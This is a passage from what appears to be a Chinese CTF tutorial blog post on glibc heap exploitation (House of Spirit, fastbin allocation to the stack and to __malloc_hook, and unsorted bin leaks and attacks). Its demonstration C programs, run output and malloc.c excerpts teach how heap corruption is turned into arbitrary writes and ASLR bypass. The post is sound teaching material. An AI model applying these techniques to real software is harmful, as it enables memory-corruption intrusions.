class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Freeing the overwritten pointer.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>fake_chunks<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>fake_chunks<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"malloc(0x30): %p\n"</span><span class="token punctuation">,</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">This file demonstrates the house of spirit attack<span class="token punctuation">.</span>Calling <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token punctuation">)</span> once so that it sets up its memory<span class="token punctuation">.</span>We will now overwrite a pointer to point to a fake <span class="token char">'fastbin'</span> region<span class="token punctuation">.</span>This <span class="token function">region</span> <span class="token punctuation">(</span>memory of length<span class="token operator">:</span> <span class="token number">80</span><span class="token punctuation">)</span> contains two chunks<span class="token punctuation">.</span> The first starts at <span class="token number">0x7ffc9e07e6d8</span> <span class="token operator">and</span> the second at <span class="token number">0x7ffc9e07e708.</span>This chunk<span class="token punctuation">.</span>size of <span class="token keyword">this</span> region has to be <span class="token number">16</span> more than the <span class="token function">region</span> <span class="token punctuation">(</span>to accomodate the chunk data<span class="token punctuation">)</span> <span class="token keyword">while</span> still falling into the fastbin <span class="token function">category</span> <span class="token punctuation">(</span><span class="token operator">&lt;=</span> <span class="token number">128</span> on x64<span class="token punctuation">)</span><span class="token punctuation">.</span> The <span class="token function">PREV_INUSE</span> <span class="token punctuation">(</span>lsb<span class="token punctuation">)</span> bit is ignored by free <span class="token keyword">for</span> fastbin<span class="token operator">-</span>sized chunks<span class="token punctuation">,</span> however the <span class="token function">IS_MMAPPED</span> <span class="token punctuation">(</span>second lsb<span class="token punctuation">)</span> <span class="token operator">and</span> <span class="token function">NON_MAIN_ARENA</span> <span class="token punctuation">(</span>third lsb<span class="token punctuation">)</span> bits cause problems<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> note that <span class="token keyword">this</span> has to be the size of the next malloc request rounded to the internal size used by the malloc implementation<span class="token punctuation">.</span> E<span class="token punctuation">.</span>g<span class="token punctuation">.</span> on x64<span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token operator">-</span><span class="token number">0x38</span> will all be rounded to <span class="token number">0x40</span><span class="token punctuation">,</span> so they would work <span class="token keyword">for</span> the malloc parameter at the end<span class="token punctuation">.</span> The chunk<span class="token punctuation">.</span>size of the <span class="token operator">*</span>next<span class="token operator">*</span> fake region has to be sane<span class="token punctuation">.</span> That is <span class="token operator">></span> <span class="token number">2</span><span class="token operator">*</span><span class="token function">SIZE_SZ</span> <span class="token punctuation">(</span><span class="token operator">></span> <span class="token number">16</span> on x64<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">&lt;</span> av<span class="token operator">-></span><span class="token function">system_mem</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span> <span class="token number">128</span>kb by <span class="token keyword">default</span> <span class="token keyword">for</span> the main arena<span class="token punctuation">)</span> to pass the nextsize integrity checks<span class="token punctuation">.</span> No need <span class="token keyword">for</span> fastbin size<span class="token punctuation">.</span>Now we will overwrite our pointer with the address of the fake region inside the fake first chunk<span class="token punctuation">,</span> <span class="token number">0x7ffc9e07e6d8.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> note that the memory address of the <span class="token operator">*</span>region<span class="token operator">*</span> associated with <span class="token keyword">this</span> chunk must be <span class="token number">16</span><span class="token operator">-</span>byte aligned<span class="token punctuation">.</span>Freeing the overwritten pointer<span class="token punctuation">.</span>Now the next malloc will <span class="token keyword">return</span> the region of our fake chunk at <span class="token number">0x7ffc9e07e6d8</span><span class="token punctuation">,</span> which will be <span class="token number">0x7ffc9e07e6e0</span><span class="token operator">!</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token number">0x7ffc9e07e6e0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>想要使用 House Of Spirit 的技术分配 <code>chunk</code> 到指定地址，其实并不需要修改指定地址的任何内容，<strong>关键是要能够修改指定地址的前后的内容使其可以绕过对应的检测</strong></p></blockquote><hr><h2 id="Alloc-to-Stack"><a href="#Alloc-to-Stack" class="headerlink" title="Alloc to Stack"></a>Alloc to Stack</h2><blockquote><p>该技术的核心点在于劫持 <code>fast bin</code> 链表中 <code>chunk</code> 的 <code>fd</code> 指针，<strong>把 <code>fd</code> 指针指向我们想要分配的栈上，从而实现控制栈中的一些关键数据</strong>，比如：返回地址等，需要栈上存在有满足条件的 <code>size</code> 值</p></blockquote><p>示例：（64 位程序）</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_chunk</span><span class="token punctuation">&#123;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> pre_size<span class="token punctuation">;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> size<span class="token punctuation">;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> fd<span class="token punctuation">;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> bk<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> CHUNK<span class="token punctuation">,</span> <span class="token operator">*</span>PCHUNK<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    CHUNK stack_chunk<span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>chunk1<span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>chunk_a<span class="token punctuation">;</span>    stack_chunk<span class="token punctuation">.</span>size <span class="token operator">=</span> <span class="token number">0x21</span><span class="token punctuation">;</span>    chunk1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>chunk1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span> chunk1 <span class="token operator">=</span> <span class="token operator">&amp;</span>stack_chunk<span class="token punctuation">;</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    chunk_a <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>这次我们把 <code>fake_chunk</code> 置于栈中称为 <code>stack_chunk</code></p><p>同时劫持了 <code>fast bin</code> 链表中 <code>chunk</code> 的 <code>fd</code> 值，通过把这个 <code>fd</code> 值指向 <code>stack_chunk</code> 就可以实现在栈中分配 <code>fast bin chunk</code></p></blockquote><p>执行 <code>*(long long *)chunk1=&amp;stack_chunk</code> 后，<code>chunk1</code> 的 <code>fd</code> 指针指向了 <code>stack_chunk</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A852.png" alt="CTF - PWN_堆相关的漏洞与利用52.png"></p><p>第一次执行 <code>malloc</code> 使得 <code>fast bin</code> 链表指向了 <code>stack_chunk</code>，这意味着下一次分配会使用 <code>stack_chunk</code> 的内存进行：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A853.png" alt="CTF - PWN_堆相关的漏洞与利用53.png"></p><p>可以看到第二次执行 <code>malloc</code> 的返回值 RAX 为 0x7fffffffdc80，也就是 <code>stack_chunk</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A854.png" alt="CTF - PWN_堆相关的漏洞与利用54.png"></p><p><code>stack_chunk</code> 的地址在栈上，而不在堆上：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A855.png" alt="CTF - PWN_堆相关的漏洞与利用55.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A856.png" alt="CTF - PWN_堆相关的漏洞与利用56.png"></p><hr><h2 id="Arbitrary-Alloc"><a href="#Arbitrary-Alloc" class="headerlink" title="Arbitrary Alloc"></a>Arbitrary Alloc</h2><blockquote><p>Arbitrary Alloc 其实与 Alloc to stack 是完全相同的，唯一的区别是<strong>分配的目标不再是栈中</strong></p><p>Arbitrary Alloc 在 CTF 中使用更加频繁，我们可以利用字节错位等方法来绕过 <code>size</code> 域的检验，实现任意地址分配 <code>chunk</code>，最后的效果也就相当于<strong>任意地址写任意值</strong></p></blockquote><p>实际上，只要满足目标地址存在合法的 <code>size</code> 域（这个 <code>size</code> 域是构造的，还是自然存在的都无妨），我们可以把 <code>chunk</code> 分配到任意的可写内存中，比如：<code>bss</code>、<code>heap</code>、<code>data</code>、<code>stack</code> 等等</p><p>示例：（64 位程序）</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>chunk1<span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>chunk_a<span class="token punctuation">;</span>    chunk1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>chunk1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span> chunk1 <span class="token operator">=</span> <span class="token number">0x7ffff7dd1af5</span> <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">;</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    chunk_a <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>在这个例子中，我们使用字节错位来实现直接分配 <code>fast bin</code> 到 <code>__malloc_hook</code> 的位置，相当于覆盖 <code>__malloc_hook</code> 来控制程序流程</p></blockquote><p>上述代码中的 <code>0x7ffff7dd1af5</code> 是根据本机的情况得出的值，想要得到这个值，首先我们要观察欲写入地址 <code>__malloc_hook</code> 附近是否存在可以字节错位的情况</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A857.png" alt="CTF - PWN_堆相关的漏洞与利用57.png"></p><p>图中 <code>0x7ffff7dd1b10</code> 是我们想要控制的 <code>__malloc_hook</code> 的地址，于是我们向上寻找是否可以错位出一个合法的 <code>size</code> 域。因为这是个 64 位程序，因此 <code>fast bin</code> 的范围为 32 字节到 128 字节 (<code>0x20 - 0x80</code>)</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">//这里的 size 指用户区域，因此要小 2 倍 SIZE_SZ</span>Fastbins<span class="token punctuation">[</span>idx<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x10</span><span class="token punctuation">]</span>Fastbins<span class="token punctuation">[</span>idx<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x20</span><span class="token punctuation">]</span>Fastbins<span class="token punctuation">[</span>idx<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x30</span><span class="token punctuation">]</span>Fastbins<span class="token punctuation">[</span>idx<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x40</span><span class="token punctuation">]</span>Fastbins<span class="token punctuation">[</span>idx<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x50</span><span class="token punctuation">]</span>Fastbins<span class="token punctuation">[</span>idx<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x60</span><span class="token punctuation">]</span>Fastbins<span class="token punctuation">[</span>idx<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x70</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>观察发现 <code>0x7ffff7dd1af5</code> 处可以实现错位构造出一个 <code>0x000000000000007f</code>，因为 <code>0x7f</code> 在计算 <code>fast bin index</code> 时，是属于 <code>index 5</code> 的，即 <code>chunk</code> 大小为 <code>0x70</code>：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">##define <span class="token function">fastbin_index</span><span class="token punctuation">(</span>sz<span class="token punctuation">)</span>                                                      \    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>sz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token punctuation">(</span>SIZE_SZ <span class="token operator">==</span> <span class="token number">8</span> <span class="token operator">?</span> <span class="token number">4</span> <span class="token operator">:</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span>   <span class="token comment">// 注意 sz 的大小是 unsigned int，因此只占 4 个字节</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>而 <code>chunk</code> 大小为 <code>0x70</code> 又包含了 <code>0x10</code> 的 <code>chunk_header</code>，因此我们选择分配 <code>0x60</code> 的 <code>fast bin</code>，将其加入链表：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A858.png" alt="CTF - PWN_堆相关的漏洞与利用58.png"></p><p>经过两次 <code>malloc</code> 分配后，可以观察到 <code>chunk</code> 被分配到 <code>0x7ffff7dd1afd</code>，因此我们就可以直接控制 <code>__malloc_hook</code> 的内容：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A859.png" alt="CTF - PWN_堆相关的漏洞与利用59.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A860.png" alt="CTF - PWN_堆相关的漏洞与利用60.png"></p><p>在我的 Glibc 2.23 中 <code>__realloc_hook</code> 与 <code>__malloc_hook</code> 是连在一起的：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A861.png" alt="CTF - PWN_堆相关的漏洞与利用61.png"></p><hr><h1 id="Unsorted-bin-Attack"><a href="#Unsorted-bin-Attack" class="headerlink" title="Unsorted bin Attack"></a>Unsorted bin Attack</h1><blockquote><p>Unsorted bin Attack 是一类漏洞的利用方法，是指所有基于 <code>unsorted bin</code> 机制的漏洞利用方法</p><p>参考文章：<a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unsorted-bin-attack/#unsorted-bin">Unsorted Bin Attack - CTF Wiki</a></p></blockquote><p>Unsorted bin Attack 的利用前提：</p><ul><li>控制 <code>unsorted bin chunk</code> 的 <code>bk</code> 指针</li></ul><p>Unsorted bin Attack 可以达到的效果是：<strong>实现修改任意地址值为一个较大的数值</strong></p><hr><h2 id="Unsorted-bin-Leak"><a href="#Unsorted-bin-Leak" class="headerlink" title="Unsorted bin Leak"></a>Unsorted bin Leak</h2><blockquote><p><code>unsorted bin</code> 首先可以用来<strong>泄露一些信息</strong></p></blockquote><p>由于 <code>unsorted bin</code> 在管理时为循环双向链表，若 <code>unsorted bin</code> 中有两个 <code>bin</code>，那么该链表结构如下：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A862.png" alt="CTF - PWN_堆相关的漏洞与利用62.png"></p><p>也就是说，在该链表中必有一个节点（不准确的说，是尾节点，这个就意会一下把，毕竟循环链表实际上没有头尾）的 <code>fd</code> 指针会指向 <code>main_arena</code> 结构体内部</p><p>如果我们可以把正确的 <code>fd</code> 指针泄露出来，就可以获得一个与 <code>main_arena</code> 有固定偏移的地址，这个偏移可以通过 GDB 调试得出</p><blockquote><p><code>main_arena</code> 是一个 <code>struct malloc_state</code> 类型的全局变量，是 <code>ptmalloc2</code> 管理主分配区的唯一实例，其会被分配在 <code>.data</code> 或者 <code>.bss</code> 等段上</p><p><strong>如果我们有进程所使用的 <code>libc.so</code> 文件的话，就可以获得 <code>main_arena</code> 与 libc 基地址的偏移，实现对 <code>ASLR</code> 的绕过</strong></p></blockquote><p>获得 <code>main_arena</code> 与 libc 基地址的偏移主要有两种方法：</p><ul><li>通过 <code>__malloc_trim</code> 函数得出  </li><li>通过 <code>__malloc_hook</code> 直接计算</li></ul><p>一般来说，要实现 Unsorted bin Leak，需要有 UAF</p><blockquote><p>在 CTF 中，一般的笔记管理题都会有 <code>show</code> 的功能，对<strong>处于 unsorted bin 链表尾的节点</strong> <code>show</code> 就可以获得 <code>libc</code> 的基地址了</p><p>另外，CTF 中堆往往是刚刚初始化的，所以 <code>unsorted bin</code> 一般都是干净的，<mark>当 <code>unsorted bin</code> 中只存在一个 <code>bin</code> 的时候，该 <code>bin</code> 的 <code>fd</code> 和 <code>bk</code> 都会指向 <code>main_arena</code> 中</mark></p></blockquote><p>另外，<strong>如果我们无法做到访问链表尾，但是可以访问链表头</strong>：</p><ul><li>在 32 位的环境下，对链表头进行 <code>printf</code> 等操作，往往可以把 <code>fd</code> 和 <code>bk</code> 一起输出出来，这个时候同样可以实现有效的 leak  </li><li>在 64 位的环境下，由于高地址往往为 <code>\x00</code>，很多输出函数会被截断，这个时候可能就难以实现有效的 leak</li></ul><hr><h3 id="通过-malloc-trim-得到偏移"><a href="#通过-malloc-trim-得到偏移" class="headerlink" title="通过 __malloc_trim() 得到偏移"></a>通过 __malloc_trim() 得到偏移</h3><p>在 <code>malloc.c</code> 中有这样一段代码：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span><span class="token function">__malloc_trim</span> <span class="token punctuation">(</span>size_t s<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>__malloc_initialized <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token function">ptmalloc_init</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  mstate ar_ptr <span class="token operator">=</span> <span class="token operator">&amp;</span>main_arena<span class="token punctuation">;</span>   <span class="token comment">// &lt;= here!</span>  <span class="token keyword">do</span>    <span class="token punctuation">&#123;</span>      <span class="token function">__libc_lock_lock</span> <span class="token punctuation">(</span>ar_ptr<span class="token operator">-></span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>      result <span class="token operator">|=</span> <span class="token function">mtrim</span> <span class="token punctuation">(</span>ar_ptr<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">__libc_lock_unlock</span> <span class="token punctuation">(</span>ar_ptr<span class="token operator">-></span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>      ar_ptr <span class="token operator">=</span> ar_ptr<span class="token operator">-></span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span>ar_ptr <span class="token operator">!=</span> <span class="token operator">&amp;</span>main_arena<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意到 <code>mstate ar_ptr = &amp;main_arena</code> 这里对 <code>main_arena</code> 进行了访问，所以<strong>通过 IDA 分析 libc 文件中的 <code>malloc_trim()</code> 函数就可以得到 libc 偏移了</strong></p><p>以 Glibc 2.23 中的 <code>malloc_trim()</code> 函数为例：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A863.png" alt="CTF - PWN_堆相关的漏洞与利用63.png"></p><p>其位于 <code>.bss</code> 段上，可见 <code>main_arena</code> 与 libc 基地址的偏移为 <code>0x3C4B20</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A864.png" alt="CTF - PWN_堆相关的漏洞与利用64.png"></p><p>我们以 《<a href="%E3%80%90Asis%20CTF%202016%E3%80%91b00ks.md">【Asis CTF 2016】b00ks</a>》 一文中泄漏的地址来进行验证：（同为 Glibc 2.23 环境）</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks34.png" alt="【Asis CTF 2016】b00ks34.png"></p><p><code>main_arena</code> 与 libc 基地址的偏移为：<code>0x7efea8cc9b20 - 0x7efea8905000 = 0x3c4b20</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A865.png" alt="CTF - PWN_堆相关的漏洞与利用65.png"></p><hr><h3 id="通过-malloc-hook-计算偏移"><a href="#通过-malloc-hook-计算偏移" class="headerlink" title="通过 __malloc_hook 计算偏移"></a>通过 __malloc_hook 计算偏移</h3><p><code>main_arena</code> 和 <code>__malloc_hook</code> 的地址差是 0x10，而大多数的 libc 都可以直接查出 <code>__malloc_hook</code> 的地址</p><p>因此 <code>main_arena</code> 与 libc 基地址的偏移可以直接得到：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">main_arena_offset <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"libc.so.6"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__malloc_hook"</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">0x10</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="Unsorted-bin-Attack-1"><a href="#Unsorted-bin-Attack-1" class="headerlink" title="Unsorted bin Attack"></a>Unsorted bin Attack</h2><p>在 <code>glibc/malloc/malloc.c</code> 中的 <code>_int_malloc</code> 有这么一段代码：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/* remove from unsorted list */</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__glibc_unlikely</span> <span class="token punctuation">(</span>bck<span class="token operator">-></span>fd <span class="token operator">!=</span> victim<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span><span class="token string">"malloc(): corrupted unsorted chunks 3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">unsorted_chunks</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token operator">-></span>bk <span class="token operator">=</span> bck<span class="token punctuation">;</span>bck<span class="token operator">-></span>fd <span class="token operator">=</span> <span class="token function">unsorted_chunks</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当将一个 <code>unsorted bin</code> 取出的时候，会将 <code>bck -&gt; fd</code> 的位置写入本 <code>unsorted bin</code> 的位置</p><p>也就是说，<strong>如果我们控制了 <code>bk</code> 的值，就能将 <code>unsorted_chunks (av)</code> 写到任意地址</strong></p><p>示例：（64 位程序）</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> target_var <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>   <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"%p: %ld\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>target_var<span class="token punctuation">,</span> target_var<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">free</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fprintf</span><span class="token 